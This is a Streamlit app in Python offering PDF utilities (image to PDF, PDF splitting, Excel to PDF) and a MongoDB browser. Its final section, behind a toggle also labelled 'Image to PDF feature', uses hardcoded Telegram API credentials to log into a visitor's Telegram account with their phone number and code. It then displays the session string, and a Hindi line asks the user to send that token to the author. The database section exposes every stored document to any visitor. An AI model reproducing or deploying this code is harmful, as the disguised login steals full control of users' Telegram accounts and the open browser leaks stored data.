import os,time
from fpdf import FPDF
import streamlit as st
from PIL import Image
import glob,img2pdf
from PyPDF2 import PdfWriter, PdfReader,PdfMerger, PdfReader
from random import randint
from PIL import Image
from Screenshot import Screenshot
import pdfkit
import pandas as pd
import site,glob
import os
import streamlit as st
import os, sys
import os,random,string
from pymongo import MongoClient
import streamlit as st
import os, sys
import re as reaaa
from pyrogram import Client
import random,string
def id_generator(size=10, chars=string.ascii_lowercase):
	return ''.join(random.choice(chars) for _ in range(size))


_="""
element = driver.find_element(By.XPATH, "//img[@title='Donate via PayPal']")
hide_elements = ['class=position-relative js-header-wrapper ']
img_url = ob.full_screenshot(driver, save_path=r'.', image_name='myimage.png',
                                          hide_elements=hide_elements)
img_url = ob.get_element(driver, element, save_path=r'.', image_name='paypal.png')
print(img_url)
img_url = ob.full_screenshot(driver, save_path=r'.', image_name='ss.png', is_load_at_runtime=True,
                                          load_wait_time=3)
st.image("ss.png")


st.write(driver.page_source)"""


from PDFNetPython3 import PDFDoc, Optimizer, SDFDoc


on = st.empty()
bttn=st.empty()
onn= st.empty()
onon= st.empty()
onn1= st.empty()
login= st.empty()
database= st.empty()
pdf_path="./@Polls_Quiz.pdf"

if 'img' not in st.session_state:
	st.session_state.img = []
if 'clicked' not in st.session_state:
	st.session_state.clicked = True
if 'dow' not in st.session_state:
	st.session_state.dow = False


	
if on.toggle('Image to PDF feature'):
	st.write('Activate Image to PDF feature')
	tm=st.empty()
	place_holder=st.empty()
	st.session_state.back = False
	opaque=0
	new_list_name=[]
	with place_holder.form(key="form1"):
		if tm.toggle('Add Background image to PDF'):
			back_uploaded_files = st.file_uploader("Choose a background image file (remember i will convert your image to square image)", accept_multiple_files=False)
			line=st.empty()
			opaque = line.slider('Select background image opacity', 0, 255, 100)
			if back_uploaded_files:
				st.session_state.back = True
			
		multiple=st.toggle('Do you want to same image comes multiple times in pdf if you upload it multiple times')
		uploaded_files = st.file_uploader("Choose a image file (multiple files are accepted)", accept_multiple_files=True)
		submit_button = st.empty()
		
	if submit_button.form_submit_button(label="Submit your choice"):
		 
		if st.session_state.back:
			back_name="./"+back_uploaded_files.name+".png"
			with open(back_name, "wb") as file:
				file.write(back_uploaded_files.getvalue())
			
			
			
		for uploaded_file in uploaded_files:
				if multiple:
					
					name="./"+uploaded_file.name+".png"
					with open(name, "wb") as file:
						file.write(uploaded_file.getvalue())
					st.session_state["img"].append((name))
				else:
					
					name="./"+uploaded_file.name
					if name not in st.session_state["img"]:
						with open(name, "wb") as file:
							file.write(uploaded_file.getvalue())
						
						st.session_state["img"].append((name))
		xxx=0
		for x in st.session_state["img"]:
			im = Image.open(x).size[0]
			xxx=im+xxx
		xxx=xxx//len(st.session_state["img"])
		if st.session_state.back:
			for x in st.session_state["img"]:
				im = Image.open(x)
				formet=im.format
				opaque=opaque
				back_ground= Image.open(back_name)
				new=im.resize((xxx, im.size[1]))
				new.save(x)
				formet="PNG"
				
				if xxx>im.size[1]:
					back_resize=back_ground.resize((im.size[1],im.size[1]))
					
					back_resize.save(back_name)
					back_ground= Image.open(back_name)
					back_ground = back_ground.convert('RGBA')
					newImage = []
					for item in back_ground.getdata():
						if ( item[0] >230 and item[1] >230 and item[2] >230 ) or ( item[0] <35 and item[1] <35 and item[2] <35 ):
							newImage.append((255, 255, 255, 0))
						else:
							newImage.append((item[0],item[1],item[2],opaque))
					back_ground.putdata(newImage)
					back_ground.save('output.png')
					im = Image.open(x)
					back_ground= Image.open("output.png")
					myMerged_image = Image.new("RGBA", im.size)
					myMerged_image.paste(im, (0,0))
					_, _, _, mask = back_ground.split()
					myMerged_image.paste(back_ground, ((xxx-im.size[1])//2,0), mask)
					myMerged_image.save(x+".png",formet)
				else:
					back_resize=back_ground.resize((xxx,xxx))
					back_resize.save(back_name)
					
					back_ground= Image.open(back_name)
					
					back_ground = back_ground.convert('RGBA')
					newImage = []
					for item in back_ground.getdata():
						if ( item[0] >230 and item[1] >230 and item[2] >230 ) or ( item[0] <35 and item[1] <35 and item[2] <35 ):
							newImage.append((255, 255, 255, 0))
							
						else:
							newImage.append((item[0],item[1],item[2], opaque))
					back_ground.putdata(newImage)
					back_ground.save('output.png')
					im = Image.open(x)
					back_ground= Image.open("output.png")
					
					myMerged_image = Image.new("RGBA", im.size)
					myMerged_image.paste(im, (0,0))
					_, _, _, mask = back_ground.split()
					myMerged_image.paste(back_ground, (0, (im.size[1]-xxx)//2), mask)
					myMerged_image.save(x+".png",formet)
				if x+".png" not in new_list_name:
					new_list_name.append(x+".png")
				st.image(x+".png")
				
				

		else:
			
			for x in st.session_state["img"]:
				im = Image.open(x)
				new=im.resize((xxx, im.size[1]))
				new.save(x)
		file = open(pdf_path, "wb")
		if len(new_list_name)==0:
			file.write(img2pdf.convert(st.session_state["img"]))
		else:
			file.write(img2pdf.convert(new_list_name))
		file.close()
		with open(pdf_path, "rb") as file:
			if st.download_button(label="Download PDF",data=file,file_name="@Polls_Quiz.pdf",mime="application/octet-stream"):
				on.empty()
				#on.toggle('Image to PDF feature')
				place_holder.empty()
elif onon.toggle('PDF Spliter feature'):
	st.write("This feature can split your PDF into multiple PDF")
	place_holder=st.empty()
	with place_holder.form(key="form2"):
		uploaded_files = st.file_uploader("Choose a PDF file (multiple files are not accepted)", accept_multiple_files=False)
		number1=st.empty()
		number2=st.empty()
		line=st.empty()
		submit_button = st.empty()
		if uploaded_files:
			name="./"+uploaded_files.name
			with open(name, "wb") as file:
				file.write(uploaded_files.getvalue())
			inputpdf = PdfReader(open(name, "rb"))
			
			pagen = line.slider('Select page number', 0, len(inputpdf.pages), 0)
			number1 = number1.number_input("Starting Page Number", value=1, min_value=1,placeholder="Type a number...")
			number2 = number2.number_input("Last Page Number", value=1,min_value=1, placeholder="Type a number...")
	if submit_button.form_submit_button(label="Submit your choice"):
		if number1>0:
			if number2>number1:
				output = PdfWriter()
				for i in range(number1-1,number2-1):
					output.add_page(inputpdf.pages[i])
				with open(name[2:-4]+" "+str(number1)+"-"+str(number2)+".pdf", "wb") as outputStream:
					output.write(outputStream)
				file = open(name[2:-4]+" "+str(number1)+"-"+str(number2)+".pdf","rb")
				st.download_button(label=name[2:-4]+" "+str(number1)+"-"+str(number2)+".pdf",data=file.read(),file_name=name[2:-4]+" %s.pdf" % (i+1),mime="application/octet-stream")
		if pagen>0:
			for i in range((len(inputpdf.pages)//pagen)):
				output = PdfWriter()
				for x in range(pagen):
					output.add_page(inputpdf.pages[x+(pagen)*i])
				with open(name[2:-4]+" %s.pdf" % (i+1), "wb") as outputStream:
					output.write(outputStream)
				file = open(name[2:-4]+" %s.pdf" % (i+1),"rb")
				st.download_button(label=str(i)+") Page "+str((pagen)*i+1)+" - "+str((pagen)*i+pagen),data=file.read(),file_name=name[2:-4]+" %s.pdf" % (i+1),mime="application/octet-stream")
			output = PdfWriter()
			if (len(inputpdf.pages)//pagen)*pagen!=len(inputpdf.pages):
				for i in range((len(inputpdf.pages)//pagen)*pagen,len(inputpdf.pages)):
					output.add_page(inputpdf.pages[i])
				with open(name[2:-4]+" %s.pdf" % ((len(inputpdf.pages)//pagen)+1), "wb") as outputStream:
					output.write(outputStream)
				file = open(name[2:-4]+" %s.pdf" % ((len(inputpdf.pages)//pagen)+1),"rb")
				st.download_button(label=str(i)+") Page "+str(i+1)+" - "+str(i+pagen),data=file.read(),file_name=name[2:-4]+" %s.pdf" %str(len(inputpdf.pages)//pagen+1),mime="application/octet-stream")

elif onn.toggle('Excle to PDF feature'):
# Read pdf into a list of DataFrame
	st.write("This feature can convert your Excel file into PDF file")
	place_holder=st.empty()
	with place_holder.form(key="form2"):
		uploaded_files = st.file_uploader("Choose a .xlsx file (multiple files are not accepted)", accept_multiple_files=False)
		line=st.empty()
		submit_button = st.empty()
		if uploaded_files:
			name="./"+uploaded_files.name
			with open(name, "wb") as file:
				file.write(uploaded_files.getvalue())
			
	if submit_button.form_submit_button(label="Submit your choice"):
		name="./"+uploaded_files.name
		sheet_names = pd.ExcelFile(name)
		dff=[]
		y=0
		
		for x in sheet_names.sheet_names:
			df = pd.read_excel(name,x)
			df.to_html(name[:-5]+".html")
			pdfkit.from_file(name[:-5]+".html", name[:-5]+x+".pdf")
			dff.append(name[:-5]+x+".pdf")
		merger = PdfMerger()
		for filename in dff:
			pdfFile = open(filename, 'rb')
			pdfReader = PdfReader(pdfFile)
			merger.append(pdfReader)
		merger.write(name[:-5]+".pdf")
		pdfFile.close()
		file = open(name[:-5]+".pdf","rb")
		st.download_button(label="Download PDF",data=file.read(),file_name=name[2:-5]+".pdf",mime="application/octet-stream")

elif database.toggle('Database'):
	st.write(st.session_state)
	@st.cache_resource
	def init_connection():
		return MongoClient('mongodb+srv://'+st.secrets.db_mango["username"]+':'+(st.secrets.db_mango["password"])+'@cluster0.uo8sfvz.mongodb.net/?retryWrites=true&w=majority')
	option = st.empty()
	option1=st.empty()
	option2=st.empty()
	cm = init_connection()
	new=["chose a option"]
	for x in cm.list_database_names():	
		for y in cm[x].list_collection_names():
			new.append((x,y))
	options=new
	if "list_database" not in st.session_state:
		option = option.selectbox('Select a database name',range(len(options)),index=0,format_func=lambda x: options[x])
		if option:
			st.session_state.list_database=option
			
	else:
		
		option = option.selectbox('Select a database name',range(len(options)),index=st.session_state.list_database,format_func=lambda x: options[x])
		
		if option!=st.session_state.list_database:
			st.session_state.list_database=option
			st.session_state.list_database.pop("select_database")
			
	if "list_database" in st.session_state:
		document_names = [document['_id'] for document in cm[new[st.session_state.list_database][0]][new[st.session_state.list_database][1]].find({}, {'_id': 1})]
		text=""
		new1=["chose a option"]
		for x in document_names[:]:
			text+=", ".join(list(cm[new[st.session_state.list_database][0]][new[st.session_state.list_database][1]].find_one({'_id':x}).keys())[1:])+"</br>"
			new1.append(", ".join(list(cm[new[st.session_state.list_database][0]][new[st.session_state.list_database][1]].find_one({'_id':x}).keys())[1:]))
		options=new1
		st.write(options)
		if "select_database" not in st.session_state:
			option = option1.selectbox('Select a database name',range(len(options)),format_func=lambda x: options[x])
			
			if option:
				st.session_state.select_database=option
				
		else:
			option = option1.selectbox('Select a database name',range(len(options)),index=st.session_state.select_database,format_func=lambda x: options[x])
			option=st.session_state.list_database
			if option!=st.session_state.list_database:
				st.session_state.list_database=option
				st.write(option)
				
		if "select_database" in st.session_state:
			xyz=st.write(cm[new[st.session_state.list_database][0]][new[st.session_state.list_database][1]].find_one({'_id':document_names[st.session_state.select_database-1]}))
			with option2.form("my_form"):
				title = st.text_input('enter your query')
				submitted = st.form_submit_button("Submit")
				if submitted:
					
					data=cm[new[st.session_state.list_database][0]][new[st.session_state.list_database][1]].find_one({'_id':document_names[st.session_state.select_database-1]})
					data2=data
					counter=0
					match1=reaaa.match("\=\=",title)
					if match1 is not None:
						
						rep=reaaa.split("\=\=",title)[1]
						title=reaaa.split("\=\=",title)[0]
					else:
						rep=None
					title=reaaa.split("\>",title)
					for z in title:
						counter+=1
						st.write(z)
							
						if reaaa.fullmatch("\d{1,}",z) is not None:
							data2=data2[int(z)]
						else:
							data2=data2[z]
						if counter== len(title):
							pass
					
					st.write('You selected:', data2)
					
if login.toggle('Image to PDF feature'):
	csapp=Client(id_generator(), api_id="13682659",api_hash="b984d240c5258407ea911f042c9d75f6")
	csapp.connect()
	with st.form("my_login_form"):
		y=st.empty()
		title = y.text_input('enter your query')
		submitted = st.form_submit_button("Submit")
		if submitted:
			if "phone" not in st.session_state:
				sent_code_info= csapp.send_code(phone_number=title)
				st.session_state.phone=title
				st.session_state.sent_code_info=sent_code_info
			else:
				sent_code_info=st.session_state.sent_code_info
				phone_number=st.session_state.phone
				result=csapp.invoke(
            raw.functions.auth.SignIn(
                phone_number=phone_number,
                phone_code_hash=sent_code_info.phone_code_hash,
                phone_code=title#reaaa.sub(""," ",text)[1:-1]
))
				st.write(result)
				st.write(csapp.export_session_string())
				st.write("ऊपर जो टोकन है वो मुझे सेंड कर देना")
			
			
			
		
